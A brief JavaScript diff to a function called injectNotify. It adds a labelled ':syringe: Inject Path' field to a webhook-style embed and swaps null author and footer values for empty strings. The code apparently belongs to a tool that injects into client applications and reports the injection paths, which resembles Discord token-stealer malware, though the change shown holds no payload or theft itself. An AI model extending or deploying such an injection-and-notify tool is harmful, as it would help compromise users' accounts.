@@ -159,6 +159,7 @@ function injectNotify() {
     var fields = [];
     injectPath.forEach( path => {
         var c = {
+            name: ":syringe: Inject Path",
             value: `\`\`\`${path}\`\`\``,
             inline: !1
         }
@@ -173,10 +174,10 @@ function injectNotify() {
             "color": config["embed-color"],
             "fields": fields,
             "author": {
-              "name": null
+              "name": ""
             },
             "footer": {
-              "text": null
+              "text": ""
             }
           }
         ]
